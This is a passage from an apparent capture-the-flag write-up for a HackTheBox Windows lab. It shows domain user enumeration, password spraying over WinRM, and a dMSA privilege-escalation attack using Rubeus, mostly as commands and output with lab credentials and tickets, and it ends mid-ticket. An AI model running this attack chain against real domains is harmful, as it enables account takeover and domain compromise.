+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ nxc  mssql 10.129.116.222 -u kevin -p &#x27;iNa2we6haRj2gaw!&#x27; --local-auth --rid-brute</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             500: EIGHTEEN\Administrator</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             501: EIGHTEEN\Guest</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             502: EIGHTEEN\krbtgt</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             512: EIGHTEEN\Domain Admins</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             513: EIGHTEEN\Domain Users</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             514: EIGHTEEN\Domain Guests</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             515: EIGHTEEN\Domain Computers</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             516: EIGHTEEN\Domain Controllers</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             517: EIGHTEEN\Cert Publishers</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             518: EIGHTEEN\Schema Admins</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             519: EIGHTEEN\Enterprise Admins</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             520: EIGHTEEN\Group Policy Creator Owners</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             521: EIGHTEEN\Read-only Domain Controllers</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             525: EIGHTEEN\Protected Users</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             526: EIGHTEEN\Key Admins</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             527: EIGHTEEN\Enterprise Key Admins</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             528: EIGHTEEN\Forest Trust Accounts</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             529: EIGHTEEN\External Trust Accounts</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             553: EIGHTEEN\RAS and IAS Servers</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1000: EIGHTEEN\DC01$</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1101: EIGHTEEN\DnsAdmins</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1102: EIGHTEEN\DnsUpdateProxy</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1601: EIGHTEEN\mssqlsvc</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1603: EIGHTEEN\HR</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1604: EIGHTEEN\IT</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1605: EIGHTEEN\Finance</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1606: EIGHTEEN\jamie.dunn</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1607: EIGHTEEN\jane.smith</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1608: EIGHTEEN\alice.jones</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1609: EIGHTEEN\adam.scott</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1610: EIGHTEEN\bob.brown</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1611: EIGHTEEN\carol.white</span><br><span class="line">MSSQL       10.129.116.222  1433   DC01             1612: EIGHTEEN\dave.green</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a list of domain users. Let’s spray the cracked password <code>iloveyou1</code> across them via WinRM.</p>
+<h2 id="User-Flag-Password-Spraying"><a href="#User-Flag-Password-Spraying" class="headerlink" title="User Flag - Password Spraying"></a>User Flag - Password Spraying</h2><p>We spray the password against all discovered domain users over WinRM:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nxc  winrm 10.129.116.222 -u users -p &#x27;iloveyou1&#x27;</span><br><span class="line">WINRM       10.129.116.222  5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)</span><br><span class="line">WINRM       10.129.116.222  5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1</span><br><span class="line">WINRM       10.129.116.222  5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1</span><br><span class="line">WINRM       10.129.116.222  5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1</span><br><span class="line">WINRM       10.129.116.222  5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><code>[+]</code> We get a hit on <code>adam.scott:iloveyou1</code>. We connect using <code>evil-winrm</code> and grab the user flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.129.116.222 -u adam.scott -p iloveyou1</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; cd ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\desktop&gt; cat user.txt</span><br><span class="line">d6d73b2bfe99ca5ceaf483e446443f74</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\desktop&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-dMSA-Abuse"><a href="#Privilege-Escalation-dMSA-Abuse" class="headerlink" title="Privilege Escalation - dMSA Abuse"></a>Privilege Escalation - dMSA Abuse</h2><p>Windows Server 2025 introduces <strong>Delegated Managed Service Accounts (dMSA)</strong>, a new account type designed to replace legacy service accounts. The key feature we abuse here is the <code>msDS-ManagedAccountPrecededByLink</code> attribute — when a dMSA “supersedes” another account, the KDC grants it all the privileges of the preceded account, including its keys.</p>
+<p>Since <code>adam.scott</code> has the ability to create dMSA objects in the <code>OU=Staff</code> organizational unit, we can:</p>
+<ol>
+<li>Create a new dMSA</li>
+<li>Set its <code>msDS-ManagedAccountPrecededByLink</code> to point to the Administrator account</li>
+<li>Set <code>msDS-DelegatedMSAState</code> to <code>2</code> (indicating migration is complete)</li>
+<li>Request a TGT as the dMSA, which will carry the Administrator’s keys</li>
+</ol>
+<p>First, we create the dMSA and configure the ACLs:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; New-ADServiceAccount -Name &quot;testdmsa&quot; `</span><br><span class="line">    -DNSHostName &quot;testdmsa.eighteen.htb&quot; `</span><br><span class="line">    -CreateDelegatedServiceAccount `</span><br><span class="line">    -KerberosEncryptionType AES256 `</span><br><span class="line">    -PrincipalsAllowedToRetrieveManagedPassword &quot;adam.scott&quot; `</span><br><span class="line">    -Path &quot;OU=Staff,DC=eighteen,DC=htb&quot;</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; $sid = (Get-ADUser -Identity &quot;adam.scott&quot;).SID</span><br><span class="line">$acl = Get-Acl &quot;AD:\CN=testdmsa,OU=Staff,DC=eighteen,DC=htb&quot;</span><br><span class="line">$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,&quot;GenericAll&quot;,&quot;Allow&quot;)</span><br><span class="line">$acl.AddAccessRule($rule)</span><br><span class="line">Set-Acl -Path &quot;AD:\CN=testdmsa,OU=Staff,DC=eighteen,DC=htb&quot; -AclObject $acl</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; Set-ADServiceAccount -Identity testdmsa -Replace @&#123;</span><br><span class="line">    &#x27;msDS-ManagedAccountPrecededByLink&#x27;=&#x27;CN=Administrator,CN=Users,DC=eighteen,DC=htb&#x27;;</span><br><span class="line">    &#x27;msDS-DelegatedMSAState&#x27;=2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Next, we upload Rubeus and compute the AES256 key for <code>adam.scott</code>, then request a TGT:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; upload rubeus1.exe</span><br><span class="line"></span><br><span class="line">Info: Uploading /home/kali/Desktop/Tools (2)/rubeus1.exe to C:\Users\adam.scott\Documents\rubeus1.exe</span><br><span class="line"></span><br><span class="line">Data: 632832 bytes of 632832 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; mv rubeus1.exe Rubeus.exe</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; ./Rubeus.exe hash /password:&#x27;iloveyou1&#x27; /user:adam.scott /domain:eighteen.htb</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.3.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Calculate Password Hash(es)</span><br><span class="line"></span><br><span class="line">[*] Input password             : iloveyou1</span><br><span class="line">[*] Input username             : adam.scott</span><br><span class="line">[*] Input domain               : eighteen.htb</span><br><span class="line">[*] Salt                       : EIGHTEEN.HTBadam.scott</span><br><span class="line">[*]       rc4_hmac             : 9964DAE494A77414E34AFF4F34412166</span><br><span class="line">[*]       aes128_cts_hmac_sha1 : 041716887B5EFBA3BA1DCDDAD9BBE98E</span><br><span class="line">[*]       aes256_cts_hmac_sha1 : 02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5</span><br><span class="line">[*]       des_cbc_md5          : 9DCD08CB79833D58</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; ./Rubeus.exe asktgt /user:adam.scott /aes256:02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5 /domain:eighteen.htb /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.3.3</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Using aes256_cts_hmac_sha1 hash: 02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5</span><br><span class="line">[*] Building AS-REQ (w/ preauth) for: &#x27;eighteen.htb\adam.scott&#x27;</span><br><span class="line">[*] Using domain controller: fe80::1a5e:1ffe:1b5d:e732%3:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFpjCCBaKgAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZWlnaHRlZW4uaHRio4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEsw+u+xS26gdiXbpbFgTotyUQazQBd6ABbxjGK8InytxS8Y9yXj96Za1OwpyvgY59Uwvjy4zBKNZq6y7JXV8z8RgRvrNOqCTSBBNv//2NXtp5r+D5K01lDF8XMFVtrtYg0r6bKGPzxA9YrJSRe3NoCpCOyyxz2cgqteLwZxHdKvCuBzV5Oh57Gqob295yAaQrlJJvqWwgAOM5o57AXe6Y1NpCNSRMTqtul3f4T0H7RABoMc6bsNcj1rMc0F80FuPLkeLaSin+S3PZSL/8YgcILpNCRGHMn7czpN5Ychk046JwhIvIJDM2PeB2bJyiAVtTJl37Gnz536JyfBaMPjhem0eQLLh/7H5Ly3UOuGuHmTtR4ME6H1GfjIR7/fGJ0OUu80RQko7jWGCNH5F++tqUj+ws3lPJi82SByJVpSLyKZd9cy+6ISvUlY+wteIY3wES9vy5v3Q3B02uLN4vZ1Rn10ZgoiWuA5qzUghowFm0VHQd+tR9PPAS85YsHX2opqJ5TljBS295M7hPGXbLI4HGbmwl0F7lpG1EioszardVIsEPbSRhv37DRcKt8sqGhXePfd5avltJ9K2VstpH2n9OIsuQ0oxh0Rzbf3/TfLvIlCoTRG78LdaPndl/w/bYrSj+aKPYCX3p3V9IO0Lrwo8mDsTlKp+NIJA6edYyk+8h9CvRqpZNVWmuTZMhuCEhNy3+1qnGAeYLXMuHDvGFNdDaYxkoUrYUpbe/JmWT5s5TsCSgSAns0og8oExhXFpLMmtrqPhvNZr+F4LZUS0a1YxakIMKbwmTQ8s3Bpk1wnHIpi7BPMq1vfTV85zHIbyXDIinHhuoIT5xfqGtf3tF6Hu0BvI1gP37nsisSSY5HWg7fLiET3Hdf06lUy8Bahhsk2vf4HXzOx/7CRFoBcT8LggIMGiuk8JWSwkiGb9VWOcWFpYw3jpwBioJBRzR7Le648LSSUCleBLgexTakbPs/+Oh1CBUWp5VxyGF7qOpgdW3Nvl9ajKjTiXpA6cn75+kMKxc+lsowaos9Gx49KmN/uBsHpgWRfkX/7S3NXhyh7rFFgFB9FYmgN2IAxMJR13e/Zpe1mc926ZQydvDuIKXvYt3GAYYaVk92NimmnrT6ika4cnxQ20SpPVOsL04DblgYX02tL4/ZRT5AhtELAzNpZOUVzY26SciwLtLl3XyBsfeBaTWh3lMaWvtrIrhFqPjsk3yW/yp74s+j/AAh9vcbGCDvKgK0yiwEZIhU7RdJD7x3eQZZFWAS00ulEgmb4Z3BmNep1qhKPK2lGCnglxoxJdN9iFfcy2UXUJufMQ2D90e6pHSpofHmJc2SOs04tTynWpYuIVPH13WyeG5RYf8nOCWuwzjfXnIwkJjp3KoN0ouv4GOk+s2bLDfnw0hzd32/Wlg1b2LS+AGYzgYjwAyrdlVyB2XfoIHDXfKJjBLvOp7oUAdpOsJBbWud+E9dpo4HoMIHloAMCAQCigd0Egdp9gdcwgdSggdEwgc4wgcugKzApoAMCARKhIgQgfW5N5UjEp1VTzTCh29CeaExi2BUrlwJtVKDiYdMzFAmhDhsMRUlHSFRFRU4uSFRCohcwFaADAgEBoQ4wDBsKYWRhbS5zY290dKMHAwUAQOEAAKURGA8yMDI1MTExOTE1MDIyNFqmERgPMjAyNTExMjAwMTAyMjRapxEYDzIwMjUxMTI2MTUwMjI0WqgOGwxFSUdIVEVFTi5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGVpZ2h0ZWVuLmh0Yg==</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/eighteen.htb</span><br><span class="line">  ServiceRealm             :  EIGHTEEN.HTB</span><br><span class="line">  UserName                 :  adam.scott (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  EIGHTEEN.HTB</span><br><span class="line">  StartTime                :  11/19/2025 7:02:24 AM</span><br><span class="line">  EndTime                  :  11/19/2025 5:02:24 PM</span><br><span class="line">  RenewTill                :  11/26/2025 7:02:24 AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">  Base64(key)              :  fW5N5UjEp1VTzTCh29CeaExi2BUrlwJtVKDiYdMzFAk=</span><br><span class="line">  ASREP (key)              :  02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we use the <code>/dmsa</code> flag in Rubeus to request a TGS as <code>testdmsa$</code>, which will inherit the Administrator’s credentials:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; ./Rubeus.exe asktgs /targetuser:testdmsa$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap  /ticket:doIFpjCCBaKgAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZWlnaHRlZW4uaHRio4IEYTCCBF2gAwIBEqEDAgECooIETwSCBEsw+u+xS26gdiXbpbFgTotyUQazQBd6ABbxjGK8InytxS8Y9yXj96Za1OwpyvgY59Uwvjy4zBKNZq6y7JXV8z8RgRvrNOqCTSBBNv//2NXtp5r+D5K01lDF8XMFVtrtYg0r6bKGPzxA9YrJSRe3NoCpCOyyxz2cgqteLwZxHdKvCuBzV5Oh57Gqob295yAaQrlJJvqWwgAOM5o57AXe6Y1NpCNSRMTqtul3f4T0H7RABoMc6bsNcj1rMc0F80FuPLkeLaSin+S3PZSL/8YgcILpNCRGHMn7czpN5Ychk046JwhIvIJDM2PeB2bJyiAVtTJl37Gnz536JyfBaMPjhem0eQLLh/7H5Ly3UOuGuHmTtR4ME6H1GfjIR7/fGJ0OUu80RQko7jWGCNH5F++tqUj+ws3lPJi82SByJVpSLyKZd9cy+6ISvUlY+wteIY3wES9vy5v3Q3B02uLN4vZ1Rn10ZgoiWuA5qzUghowFm0VHQd+tR9PPAS85YsHX2opqJ5TljBS295M7hPGXbLI4HGbmwl0F7lpG1EioszardVIsEPbSRhv37DRcKt8sqGhXePfd5avltJ9K2VstpH2n9OIsuQ0oxh0Rzbf3/TfLvIlCoTRG78LdaPndl/w/bYrSj+aKPYCX3p3V9IO0Lrwo8mDsTlKp+NIJA6edYyk+8h9CvRqpZNVWmuTZMhuCEhNy3+1qnGAeYLXMuHDvGFNdDaYxkoUrYUpbe/JmWT5s5TsCSgSAns0og8oExhXFpLMmtrqPhvNZr+F4LZUS0a1YxakIMKbwmTQ8s3Bpk1wnHIpi7BPMq1vfTV85zHIbyXDIinHhuoIT5xfqGtf3tF6Hu0BvI1gP37nsisSSY5HWg7fLiET3Hdf06lUy8Bahhsk2vf4HXzOx/7CRFoBcT8LggIMGiuk8JWSwkiGb9VWOcWFpYw3jpwBioJBRzR7Le648LSSUCleBLgexTakbPs/+Oh1CBUWp5VxyGF7qOpgdW3Nvl9ajKjTiXpA6cn75+kMKxc+lsowaos9Gx49KmN/uBsHpgWRfkX/7S3NXhyh7rFFgFB9FYmgN2IAxMJR13e/Zpe1mc926ZQydvDuIKXvYt3GAYYaVk92NimmnrT6ika4cnxQ20SpPVOsL04DblgYX02tL4/ZRT5AhtELAzNpZOUVzY26SciwLtLl3XyBsfeBaTWh3lMaWvtrIrhFqPjsk3yW/yp74s+j/AAh9vcbGCDvKgK0yiwEZIhU7RdJD7x3eQZZFWAS00ulEgmb4Z3BmNep1qhKPK2lGCnglxoxJdN9iFfcy2UXUJufMQ2D90e6pHSpofHmJc2SOs04tTynWpYuIVPH13WyeG5RYf8nOCWuwzjfXnIwkJjp3KoN0ouv4GOk+s2bLDfnw0hzd32/Wlg1b2LS+AGYzgYjwAyrdlVyB2XfoIHDXfKJjBLvOp7oUAdpOsJBbWud+E9dpo4HoMIHloAMCAQCigd0Egdp9gdcwgdSggdEwgc4wgcugKzApoAMCARKhIgQgfW5N5UjEp1VTzTCh29CeaExi2BUrlwJtVKDiYdMzFAmhDhsMRUlHSFRFRU4uSFRCohcwFaADAgEBoQ4wDBsKYWRhbS5zY290dKMHAwUAQOEAAKURGA8yMDI1MTExOTE1MDIyNFqmERgPMjAyNTExMjAwMTAyMjRapxEYDzIwMjUxMTI2MTUwMjI0WqgOGwxFSUdIVEVFTi5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGVpZ2h0ZWVuLmh0Yg==</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.3.3</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGS</span><br><span class="line"></span><br><span class="line">[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket</span><br><span class="line">[*] Building DMSA TGS-REQ request for &#x27;testdmsa$&#x27; from &#x27;adam.scott&#x27;</span><br><span class="line">[+] Sequence number is: 461317186</span><br><span class="line">[*] Using domain controller: DC01.eighteen.htb (fe80::1a5e:1ffe:1b5d:e732%3)</span><br><span class="line">[+] TGS request successful!</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFzDCCBcigAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRCo4IEiDCCBISgAwIBEqEDAgECooIEdgSCBHL2XYiAW9sLcli+ZT49qHoVwybVwYG+jhDaWsvA3pYlenCk1peCPt6mvy2CmkbcH0jYaeYtat0Dr51cF5I4Nhcc9Gy5I8d/WpyZXQ3X5VdKCVtayviSBJ3+B8IjyVLyJAuihM/PKvSmI9qAbT/fd5K3IDHm76jH69QXKD8nyR7e5yNJ1QuksML8hrZ54tmPLHr5jlacPJ6zo/OAMeeWZwAE+1DRkHTO49TgOPZ8rRAiQ2WDG+ZTXpbsQK5vyF5BkqhxDyNtBnECprxXyf1ooeHgkhKrpM9z8zp8gIyk1aCti9phj5wGxUE2f9n8bAxejJZnqsMNrwJI6XwkShfME9dN7nTVJp9fMmvN6lTnv3RFxwmnNgSHU9l9Imud+NCYkHg49cqvVYQmanwjlVIvDDtvrqk1yChEaMBdAA3JHQhEoTCNM2KHLFqA7IbTE0Q5AdB8SdDeyLxP9i+2TSLNKH6WCE9BDTuh/VLVNt2vTlyEAIouZD4mR/vxa/Vtgc7Q8vRHWxA5abFtn6vW8TEoLzrhcup/bDMP4G9KLpB0UUKkeeYBoiS/782hUElcNo+BvwqVVhVzi7PBVAa0h2+z4VJd+tXimeaZOIK1rmfF1CNHUBo/qEZY0huKPXiDpppxeYjIzJIs8IzOR1Gvcm476Oz72wBmYq/JmDG1YLTlV6TCJqtiXGdGCbS/vG2lbZ/pxUq6cd45jhkggbL1kKcGBacqUa9o67qglALLBLcN4AYXXArBFwUxtdZwO32cgFeoQQtUUFH2kR6rDw4TIs9FhLwdTiPr5bmd90qtLW95HXyqzdS3P+6KJ95vNyLvLp/nHSV3mtj+ZsOnoZGSsamjSImWCSvjpklsbt7hkrqubB2CBBBo91ryyQgqvCVTyIxWgmAeC18ZmJz2RXrFc2pc3tD92LdKUwucccnRlm86H71/qqhPD4xgyVhAZLfvLu3yyz1jwMAQz8+odexz4CYrZ3HJ2ZbfXFT0OTgpHG5Hs3SyKSjGPSEyx0e0iXweV57Vf5mHI/Lo9xs+agV/GwGDHMVuLTpL1cb8KhT2rCUBeU/sKjXBtiKaecQDGlDjdfsanAN6nIXVg/K5bYM/oIKOGOv7LFOH/FALQyzzrk+ZNGrtg2zHlPjAYQUvnaD/hUn0iDX1gV1z38K840Pd1i9b0eOlAo3+FBmgvgWyoNEJjJ3yytb6Hf/ZXUlMAjqNbXtp0T3UtaNRp3WDYo8vTYqS9msZnQrs2b0/sp4kISPh19QJJoUabPSNfnUTz9RBXpfajp/kzFqWr9w13Yy17uQ8nCeZoAnqQR+JxUriNsIDcr1g6ElEG/p5dEhMFXw9Dm2gokTz5axr0ce8HcrHR2DOynLd6EDumV91CBHL9ZTAegiYm4fwCAYrE/FGK9hHbSHMTuqCgra+UevYc0HkSwY7OA8K2yn94opUtgj4DHIE7KD7L6nA8ewyVZJd5TINcI0nwBAsl6VXwzV13JOOxLlkMtFddi7gy2XywFRUoOZo6vLC5qzTo4HnMIHkoAMCAQCig